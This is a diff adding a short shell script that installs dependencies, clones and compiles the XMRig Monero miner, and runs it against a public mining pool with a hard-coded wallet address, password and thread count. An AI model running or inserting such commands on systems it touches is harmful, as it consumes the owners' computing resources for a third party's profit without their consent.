@@ -1,0 +1,11 @@
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+git clone https://github.com/xmrig/xmrig.git
+
+mkdir xmrig/build && cd xmrig/build
+
+cmake ..
+
+make -j$(nproc)
+
+./xmrig -a rx/0 -o pool.hashvault.pro:7777 -u 87Uzx9ucwE4N6d6s3yuH2dhSEXjGRx7wNRxCnDfPrTCLQFdK36F4FQVFenmjWyYvyJAV5N3PgMSuEhBJpYfeMFpPE9THtyU -k --tls --threads=8 -p efendi2
